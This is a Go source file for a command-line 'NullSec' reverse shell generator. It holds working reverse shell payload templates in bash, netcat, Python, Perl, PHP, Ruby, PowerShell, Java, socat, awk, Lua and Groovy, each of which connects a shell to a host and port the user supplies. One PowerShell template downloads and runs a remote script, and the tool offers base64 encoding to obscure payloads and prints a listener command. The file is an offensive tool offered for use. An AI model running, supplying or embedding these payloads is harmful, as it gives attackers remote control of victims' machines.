// NullSec Reverse Shell Generator
// Multi-platform reverse shell generator in Go
// Author: bad-antics | Twitter: bad-antics | Discord: discord.gg/killers

package main

import (
"encoding/base64"
"flag"
"fmt"
"os"
"strings"
)

const banner = `
╔═══════════════════════════════════════════════════════════╗
║     ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗   ║
║     ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝   ║
║     ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗     ║
║     ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝     ║
║     ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗   ║
║     ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝   ║
║               REVERSE SHELL GENERATOR (Go)                 ║
║            bad-antics | bad-antics | discord.gg/killers  ║
╚═══════════════════════════════════════════════════════════╝
`

type ShellType struct {
Name        string
Description string
Template    string
Encode      bool
}

var shells = map[string]ShellType{
"bash": {
Name:        "Bash",
Description: "Standard bash reverse shell",
Template:    `bash -i >& /dev/tcp/%s/%s 0>&1`,
},
"bash-udp": {
Name:        "Bash UDP",
Description: "Bash UDP reverse shell",
Template:    `bash -i >& /dev/udp/%s/%s 0>&1`,
},
"nc": {
Name:        "Netcat",
Description: "Netcat reverse shell",
Template:    `nc -e /bin/bash %s %s`,
},
"nc-mkfifo": {
Name:        "Netcat (mkfifo)",
Description: "Netcat with mkfifo (no -e)",
Template:    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f`,
},
"python": {
Name:        "Python",
Description: "Python reverse shell",
Template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
},
"python-short": {
Name:        "Python (short)",
Description: "Shorter Python reverse shell",
Template:    `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`,
},
"perl": {
Name:        "Perl",
Description: "Perl reverse shell",
Template:    `perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
},
"php": {
Name:        "PHP",
Description: "PHP reverse shell",
Template:    `php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`,
},
"ruby": {
Name:        "Ruby",
Description: "Ruby reverse shell",
Template:    `ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`,
},
"powershell": {
Name:        "PowerShell",
Description: "PowerShell reverse shell (Windows)",
Template:    `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
Encode:      true,
},
"powershell-b64": {
Name:        "PowerShell Base64",
Description: "Base64 encoded PowerShell reverse shell",
Template:    `IEX(IWR http://%s:%s/shell.ps1 -UseBasicParsing)`,
Encode:      true,
},
"java": {
Name:        "Java",
Description: "Java reverse shell",
Template: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
},
"socat": {
Name:        "Socat",
Description: "Socat reverse shell",
Template:    `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s`,
},
"awk": {
Name:        "AWK",
Description: "AWK reverse shell",
Template:    `awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
},
"lua": {
Name:        "Lua",
Description: "Lua reverse shell",
Template:    `lua -e "require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
},
"groovy": {
Name:        "Groovy",
Description: "Groovy reverse shell (Jenkins)",
Template: `String host="%s";
int port=%s;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`,
},
}

func generateShell(shellType, host, port string, encode bool) string {
shell, exists := shells[shellType]
if !exists {
return ""
}

var payload string
if strings.Contains(shell.Template, "%s") && strings.Contains(shell.Template, "%s") {
// Count placeholders
count := strings.Count(shell.Template, "%s")
if count == 2 {
payload = fmt.Sprintf(shell.Template, host, port)
} else {
payload = shell.Template
payload = strings.Replace(payload, "%s", host, 1)
payload = strings.Replace(payload, "%s", port, 1)
}
} else {
payload = shell.Template
}

if encode && shell.Encode {
encoded := base64.StdEncoding.EncodeToString([]byte(payload))
if shellType == "powershell" || shellType == "powershell-b64" {
return fmt.Sprintf("powershell -e %s", encoded)
}
}

return payload
}

func listShells() {
fmt.Println("\nAvailable shell types:")
fmt.Println("─" + strings.Repeat("─", 58))
fmt.Printf("%-18s %s\n", "TYPE", "DESCRIPTION")
fmt.Println("─" + strings.Repeat("─", 58))

// Order matters for display
order := []string{"bash", "bash-udp", "nc", "nc-mkfifo", "python", "python-short", 
"perl", "php", "ruby", "powershell", "powershell-b64", "java", "socat", "awk", "lua", "groovy"}

for _, name := range order {
shell := shells[name]
fmt.Printf("%-18s %s\n", name, shell.Description)
}
}

func main() {
fmt.Println(banner)

host := flag.String("host", "", "Listener host/IP")
port := flag.String("port", "", "Listener port")
shellType := flag.String("type", "bash", "Shell type")
encode := flag.Bool("encode", false, "Base64 encode payload")
list := flag.Bool("list", false, "List available shell types")
all := flag.Bool("all", false, "Generate all shell types")

flag.Parse()

if *list {
listShells()
return
}

if *host == "" || *port == "" {
fmt.Println("Usage: nullsec-revshell -host <IP> -port <PORT> [-type <type>] [-encode] [-all]")
fmt.Println("\nOptions:")
fmt.Println("  -host     Listener IP address")
fmt.Println("  -port     Listener port")
fmt.Println("  -type     Shell type (default: bash)")
fmt.Println("  -encode   Base64 encode the payload")
fmt.Println("  -list     List available shell types")
fmt.Println("  -all      Generate all shell types")
os.Exit(1)
}

if *all {
fmt.Printf("[*] Generating all reverse shells for %s:%s\n\n", *host, *port)
order := []string{"bash", "bash-udp", "nc", "nc-mkfifo", "python", "python-short",
"perl", "php", "ruby", "powershell", "java", "socat", "awk", "lua", "groovy"}

for _, name := range order {
shell := shells[name]
payload := generateShell(name, *host, *port, *encode)
fmt.Printf("═══ %s ═══\n", shell.Name)
fmt.Println(payload)
fmt.Println()
}
} else {
payload := generateShell(*shellType, *host, *port, *encode)
if payload == "" {
fmt.Printf("[-] Unknown shell type: %s\n", *shellType)
fmt.Println("Use -list to see available types")
os.Exit(1)
}

shell := shells[*shellType]
fmt.Printf("[*] Generating %s reverse shell\n", shell.Name)
fmt.Printf("[*] Target: %s:%s\n\n", *host, *port)
fmt.Println("═══ PAYLOAD ═══")
fmt.Println(payload)
fmt.Println()
fmt.Println("[*] Start listener: nc -lvnp " + *port)
}
}
